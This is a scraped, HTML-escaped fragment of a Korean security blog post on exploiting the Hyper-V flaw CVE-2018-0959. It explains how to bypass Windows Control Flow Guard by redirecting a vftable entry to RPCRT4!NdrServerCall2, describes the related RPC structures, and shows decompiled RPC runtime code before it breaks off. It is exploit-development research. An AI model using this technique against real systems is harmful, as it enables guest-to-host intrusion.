&lt;h1 id=&#34;Part-6-&amp;#xC608;&amp;#xACE0;&#34;&gt;&lt;a href=&#34;#Part-6-&amp;#xC608;&amp;#xACE0;&#34; class=&#34;headerlink&#34; title=&#34;Part 6 &amp;#xC608;&amp;#xACE0;&#34;&gt;&lt;/a&gt;Part 6 &amp;#xC608;&amp;#xACE0;&lt;/h1&gt;&lt;p&gt;&amp;#xC774;&amp;#xB85C;&amp;#xC368; CVE-2018-0959&amp;#xC758; &amp;#xBD84;&amp;#xC11D;&amp;#xBD80;&amp;#xD130; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xAE4C;&amp;#xC9C0; &amp;#xBAA8;&amp;#xB450; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xD504;&amp;#xB85C;&amp;#xC81D;&amp;#xD2B8; &amp;#xCD08;&amp;#xCC3D;&amp;#xAE30;&amp;#xC5D0; Hyper-V &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98; &amp;#xACF5;&amp;#xBD80;&amp;#xD558;&amp;#xB358;&amp;#xAC8C; &amp;#xC5CA;&amp;#xADF8;&amp;#xC81C; &amp;#xAC19;&amp;#xC740;&amp;#xB370;&amp;#x2026; &amp;#xC815;&amp;#xB9D0; &amp;#xAE38;&amp;#xACE0; &amp;#xAE34; &amp;#xC5EC;&amp;#xC815;&amp;#xC774;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xB05D;&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xC8E0;! &amp;#xB2E4;&amp;#xC74C; &amp;#xD30C;&amp;#xD2B8;&amp;#xBD80;&amp;#xD134; &amp;#xC800; &amp;#xB300;&amp;#xC2E0; L0ch&amp;#xB2D8;&amp;#xC774; CVE-2020-0917 &amp;#xBD84;&amp;#xC11D; &amp;#xAE00;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC62C; &amp;#xC608;&amp;#xC815;&amp;#xC774;&amp;#xB2C8; &amp;#xB9CE;&amp;#xC740; &amp;#xAD00;&amp;#xC2EC; &amp;#xBD80;&amp;#xD0C1;&amp;#xB4DC;&amp;#xB9BD;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
 - hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">


  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Research] NewJeans&#39; Hyper-V Part 5 - CVE-2018-0959 Exploit(2) - hackyboiz">
  <meta property="og:description" content="&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; &amp;#xD30C;&amp;#xD2B8; &amp;#xBCF4;&amp;#xB7EC;&amp;#xAC00;&amp;#xAE30;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2023/09/30/pwndorei/newjeans-hyper-v-pt1/&#34;&gt;[Research] NewJeans&amp;#x2019; Hyper-V Part 1 - Hyper-V Architecture&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2023/10/08/pwndorei/newjeans-hyper-v-pt2/&#34;&gt;[Research] NewJeans&amp;#x2019; Hyper-V Part 2 - CVE-2018-0959 Analysis(1)&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2023/10/15/pwndorei/newjeans-hyper-v-pt3/&#34;&gt;[Research] NewJeans&amp;#x2019; Hyper-V Part 3 - CVE-2018-0959 Analysis(2)&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2023/10/22/pwndorei/newjeans-hyper-v-pt4/&#34;&gt;[Research] NewJeans&amp;#x2019; Hyper-V Part 4 - CVE-2018-0959 Exploit(1)&lt;/a&gt;&lt;br&gt;&lt;strong&gt;[Research] NewJeans&amp;#x2019; Hyper-V Part 5 - CVE-2018-0959 Exploit(2) (Here)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694; &amp;#xC2DC;&amp;#xD5D8; &amp;#xB05D;&amp;#xB098;&amp;#xC11C; &amp;#xD589;&amp;#xBCF5;&amp;#xD55C; pwndorei&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xC9C0;&amp;#xB09C; &amp;#xD30C;&amp;#xD2B8; 4&amp;#xC5D0;&amp;#xC11C; DLL&amp;#xB4E4;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xB97C; &amp;#xCC3E;&amp;#xC544;&amp;#xB0C8;&amp;#xC5C8;&amp;#xC8E0;? &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB294; &amp;#xBAA8;&amp;#xB450; &amp;#xBAA8;&amp;#xC600;&amp;#xC73C;&amp;#xB2C8; &amp;#xC774;&amp;#xC81C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;!&lt;/p&gt;
&lt;h1 id=&#34;Bypass-CFG&#34;&gt;&lt;a href=&#34;#Bypass-CFG&#34; class=&#34;headerlink&#34; title=&#34;Bypass CFG&#34;&gt;&lt;/a&gt;Bypass CFG&lt;/h1&gt;&lt;p&gt;Windows Server 2012 R2&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; ROP&amp;#xB85C; CFG&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD588;&amp;#xC9C0;&amp;#xB9CC; Windows 10 Version 1709&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xBD88;&amp;#xD589;&amp;#xD558;&amp;#xAC8C;&amp;#xB3C4; OOB Read/Write&amp;#xB85C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC870;&amp;#xAE08; &lt;del&gt;&amp;#xB9CE;&amp;#xC774; &amp;#xBCF5;&amp;#xC7A1;&amp;#xD558;&amp;#xACE0;&lt;/del&gt; &amp;#xD2B9;&amp;#xBCC4;&amp;#xD55C; &amp;#xBC29;&amp;#xBC95;&amp;#xC73C;&amp;#xB85C; CFG&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD560; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC720;&amp;#xCD9C;&amp;#xD55C; DLL &amp;#xC8FC;&amp;#xC18C;&amp;#xB4E4; &amp;#xC911;&amp;#xC5D0; &lt;code&gt;RPCRT4.dll&lt;/code&gt;&amp;#xC774; &amp;#xC788;&amp;#xAC74; &amp;#xAC83;&amp;#xC744; &amp;#xAE30;&amp;#xC5B5;&amp;#xD558;&amp;#xC2DC;&amp;#xB098;&amp;#xC694;?  &amp;#xC774; RPC&amp;#xB97C; &amp;#xD65C;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; CFG&amp;#xB97C; &amp;#xBB34;&amp;#xB825;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC54C;&amp;#xC544;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;!&lt;/p&gt;
&lt;h2 id=&#34;Windows-RPC-Remote-Procedure-Call&#34;&gt;&lt;a href=&#34;#Windows-RPC-Remote-Procedure-Call&#34; class=&#34;headerlink&#34; title=&#34;Windows RPC(Remote Procedure Call)&#34;&gt;&lt;/a&gt;Windows RPC(Remote Procedure Call)&lt;/h2&gt;&lt;p&gt;Remote Procedure Call&amp;#xC774;&amp;#xB780; &amp;#xC6D0;&amp;#xACA9; &amp;#xC11C;&amp;#xBC84;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xD504;&amp;#xB85C;&amp;#xC2DC;&amp;#xC800;(&amp;#xD568;&amp;#xC218;)&amp;#xB97C; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xB85C;&amp;#xCEEC; &amp;#xD568;&amp;#xC218;&amp;#xC778; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xD638;&amp;#xCD9C;&amp;#xD574;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xD574;&amp;#xC8FC;&amp;#xB294; &amp;#xAE30;&amp;#xC220;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image1.png&#34; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/ko-kr/windows/win32/rpc/how-rpc-works&#34;&gt;&amp;#xCD9C;&amp;#xCC98;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;#xC704; &amp;#xADF8;&amp;#xB9BC;&amp;#xC740; Windows RPC&amp;#xC758; &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xB97C; &amp;#xB098;&amp;#xD0C0;&amp;#xB0B8; &amp;#xADF8;&amp;#xB9BC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xC640; &amp;#xC11C;&amp;#xBC84;&amp;#xC758; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC740; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB098; &amp;#xD638;&amp;#xCD9C;&amp;#xC758; &amp;#xBC18;&amp;#xD658; &amp;#xAC12;&amp;#xC744; &amp;#xADF8;&amp;#xBCF4;&amp;#xB2E4; &amp;#xC544;&amp;#xB798;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; Stub&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xACE0; Stub&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; NDR(Network Data Representation)&amp;#xD3EC;&amp;#xB9F7;&amp;#xC73C;&amp;#xB85C; &amp;#xBCC0;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xC0AC;&amp;#xC2E4; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC5D0;&amp;#xC11C; RPC&amp;#xC758; &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCC98;&amp;#xB294; &amp;#xADF8;&amp;#xB2E5; &amp;#xC911;&amp;#xC694;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E; &amp;#xC11C;&amp;#xBC84; &amp;#xCE21;&amp;#xC5D0;&amp;#xC11C; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xC758; &amp;#xD638;&amp;#xCD9C; &amp;#xC694;&amp;#xCCAD;&amp;#xC744; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xB294;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC54C;&amp;#xBA74; &amp;#xCDA9;&amp;#xBD84;&amp;#xD558;&amp;#xC8E0;. &lt;/p&gt;
&lt;h3 id=&#34;NdrServerCall2&#34;&gt;&lt;a href=&#34;#NdrServerCall2&#34; class=&#34;headerlink&#34; title=&#34;NdrServerCall2&#34;&gt;&lt;/a&gt;&lt;code&gt;NdrServerCall2&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xB294; &amp;#xC11C;&amp;#xBC84;&amp;#xAC00; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xC758; &amp;#xC694;&amp;#xCCAD;&amp;#xC744; &amp;#xC218;&amp;#xC2E0;&amp;#xD558;&amp;#xBA74; &amp;#xC774;&amp;#xB97C; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &amp;#xC778;&amp;#xC790;&amp;#xC778; &lt;code&gt;pRpcMsg&lt;/code&gt;&amp;#xB294; &amp;#xC694;&amp;#xCCAD;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xC788;&amp;#xB294; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xD3EC;&amp;#xC778;&amp;#xD130; &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; __stdcall &lt;span class=&#34;hljs-title&#34;&gt;NdrServerCall2&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PRPC_MESSAGE pRpcMsg)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
	&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; pdwStubPhase;
	pdwStubPhase = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
	NdrStubCall2(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, pRpcMsg, &amp;amp;pdwStubPhase);
}&lt;/code&gt;&lt;/pre&gt;&lt;br&gt;&amp;#xB0B4;&amp;#xBD80;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC640; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xD30C;&amp;#xC2F1;&amp;#xD558;&amp;#xACE0; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xC774;&amp;#xAC8C; CFG &amp;#xC6B0;&amp;#xD68C;&amp;#xB791; &amp;#xB300;&amp;#xCCB4; &amp;#xBB34;&amp;#xC2A8; &amp;#xC5F0;&amp;#xAD00;&amp;#xC774; &amp;#xC788;&amp;#xB294; &amp;#xAC78;&amp;#xAE4C;&amp;#xC694;? &lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xB294; &lt;code&gt;__stdcall&lt;/code&gt; &amp;#xD638;&amp;#xCD9C; &amp;#xADDC;&amp;#xC57D;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xACE0; &amp;#xC720;&amp;#xC77C;&amp;#xD55C; &amp;#xC778;&amp;#xC790;&amp;#xC778; &lt;code&gt;pRpcMsg&lt;/code&gt;&amp;#xB294; &lt;code&gt;RCX&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC804;&amp;#xB2EC;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD074;&amp;#xB798;&amp;#xC2A4;&amp;#xC758; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xC758; &amp;#xD638;&amp;#xCD9C; &amp;#xADDC;&amp;#xC57D;&amp;#xC778; &lt;code&gt;thiscall&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC774; &lt;code&gt;RCX&lt;/code&gt;&amp;#xC5D0; &amp;#xAC1D;&amp;#xCCB4;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xB294;&amp;#xB370;&amp;#xC694;? vftable&amp;#xC744; &amp;#xB36E;&amp;#xC5B4;&amp;#xC368;&amp;#xC11C; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &amp;#xC81C;&amp;#xC5B4; &amp;#xD750;&amp;#xB984;&amp;#xC744; &amp;#xC62E;&amp;#xAE38; &amp;#xC218;&amp;#xB294; &amp;#xC788;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC778;&amp;#xC790; &amp;#xC804;&amp;#xB2EC;&amp;#xC740; &amp;#xB9E4;&amp;#xC6B0; &amp;#xC81C;&amp;#xD55C;&amp;#xC801;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xC758; vftable&amp;#xC5D0;&amp;#xC11C; &amp;#xD2B9;&amp;#xC815; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xB97C; &lt;code&gt;RPCRT4!NdrServerCall2&lt;/code&gt;&amp;#xB85C; &amp;#xB36E;&amp;#xC5B4;&amp;#xC4F0;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xBA74; &lt;code&gt;VideoDirtListener&lt;/code&gt; &amp;#xC790;&amp;#xCCB4;&amp;#xAC00; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB85C; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xC9C0; &amp;#xBABB;&amp;#xD558;&amp;#xB294; &amp;#xC0C1;&amp;#xD669;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC640; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xC9C0;&amp;#xC815;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC640; &amp;#xAD00;&amp;#xB828; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB4E4;&amp;#xC758; &amp;#xAD6C;&amp;#xC870;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&lt;br&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image2.png&#34; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://iamelli0t.github.io/2021/04/10/RPC-Bypass-CFG.html&#34;&gt;&amp;#xCD9C;&amp;#xCC98;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;#xC798; &amp;#xD45C;&amp;#xD604;&amp;#xB41C; &amp;#xADF8;&amp;#xB9BC;&amp;#xC774;&amp;#xB77C; &amp;#xAC00;&amp;#xC838;&amp;#xC654;&amp;#xB294;&amp;#xB370; x86&amp;#xC774;&amp;#xB124;&amp;#xC694; &amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xAC01; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xBCC4;&amp;#xB85C; &amp;#xC911;&amp;#xC694;&amp;#xD55C; &amp;#xD544;&amp;#xB4DC;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;&lt;/p&gt;
&lt;h4 id=&#34;RPC-MESSAGE&#34;&gt;&lt;a href=&#34;#RPC-MESSAGE&#34; class=&#34;headerlink&#34; title=&#34;RPC_MESSAGE&#34;&gt;&lt;/a&gt;&lt;code&gt;RPC_MESSAGE&lt;/code&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Buffer: &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xB294; &amp;#xBC84;&amp;#xD37C;&lt;/li&gt;
&lt;li&gt;BufferLength: &amp;#xBC84;&amp;#xD37C;&amp;#xC758; &amp;#xAE38;&amp;#xC774;&lt;/li&gt;
&lt;li&gt;ProcNum: &amp;#xD504;&amp;#xB85C;&amp;#xC2DC;&amp;#xC800; &amp;#xBC88;&amp;#xD638;, DispatchTable&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC778;&amp;#xB371;&amp;#xC2A4;&lt;/li&gt;
&lt;li&gt;RpcInterfaceInformation: &lt;code&gt;RPC_SERVER_INTERFACE&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&lt;h4 id=&#34;RPC-SERVER-INTERFACE&#34;&gt;&lt;a href=&#34;#RPC-SERVER-INTERFACE&#34; class=&#34;headerlink&#34; title=&#34;RPC_SERVER_INTERFACE&#34;&gt;&lt;/a&gt;&lt;code&gt;RPC_SERVER_INTERFACE&lt;/code&gt;&lt;/h4&gt;&lt;/li&gt;
&lt;li&gt;InterpreterInfo: &lt;code&gt;MIDL_SERVER_INFO&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&lt;h4 id=&#34;MIDL-SERVER-INFO&#34;&gt;&lt;a href=&#34;#MIDL-SERVER-INFO&#34; class=&#34;headerlink&#34; title=&#34;MIDL_SERVER_INFO&#34;&gt;&lt;/a&gt;&lt;code&gt;MIDL_SERVER_INFO&lt;/code&gt;&lt;/h4&gt;&lt;/li&gt;
&lt;li&gt;pStubDesc: &lt;code&gt;MIDL_STUB_DESC&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;,&lt;/li&gt;
&lt;li&gt;DispatchTable: &amp;#xD568;&amp;#xC218; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&lt;/li&gt;
&lt;li&gt;ProcString: &amp;#xD504;&amp;#xB85C;&amp;#xC2DC;&amp;#xC800; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC815;&amp;#xBCF4;(&amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xC2A4;&amp;#xD0DD; &amp;#xD06C;&amp;#xAE30;, &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130; &amp;#xC218; &amp;#xB4F1;)&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&lt;/li&gt;
&lt;li&gt;FmtStringOffset: &amp;#xD2B9;&amp;#xC815; &amp;#xD504;&amp;#xB85C;&amp;#xC2DC;&amp;#xC800;&amp;#xC758; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; ProcString &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xB294; &amp;#xBC30;&amp;#xC5F4;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;#xC5B4;&amp;#xB5A4; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xC804;&amp;#xB2EC;&amp;#xD574;&amp;#xC57C; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xC62C;&amp;#xBC14;&amp;#xB974;&amp;#xAC8C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294;&amp;#xC9C0; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC54C;&amp;#xC544;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;!&lt;/p&gt;
&lt;h2 id=&#34;NdrStubCall2&#34;&gt;&lt;a href=&#34;#NdrStubCall2&#34; class=&#34;headerlink&#34; title=&#34;NdrStubCall2&#34;&gt;&lt;/a&gt;&lt;code&gt;NdrStubCall2&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;&amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB41C; &amp;#xACB0;&amp;#xACFC;&amp;#xAC00; &amp;#xB108;&amp;#xBB34;&amp;#x2026; &amp;#xAE34; &amp;#xAD00;&amp;#xACC4;&amp;#xB85C; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xB2E4;&amp;#xC12F; &amp;#xB2E8;&amp;#xACC4;&amp;#xB85C; &amp;#xB098;&amp;#xB204;&amp;#xC5B4; &amp;#xC124;&amp;#xBA85; &amp;#xB4DC;&amp;#xB9AC;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Context Initialize(&lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Server Initialize(&lt;code&gt;NdrpServerInit&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Argument Parsing(&lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Invoke&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Exit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;Context-Initialize&#34;&gt;&lt;a href=&#34;#Context-Initialize&#34; class=&#34;headerlink&#34; title=&#34;Context Initialize&#34;&gt;&lt;/a&gt;Context Initialize&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;nt __stdcall &lt;span class=&#34;hljs-title&#34;&gt;NdrStubCall2&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *pThis, &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *pChannel, PRPC_MESSAGE pRpcMsg, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *pdwStubPhase)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  pRpcMsga = pRpcMsg;
  v107 = pChannel;
  v101 = pRpcMsg;
  v108 = pdwStubPhase;
  memset_0(&amp;amp;pStubMsg, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(pStubMsg));
  v7 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
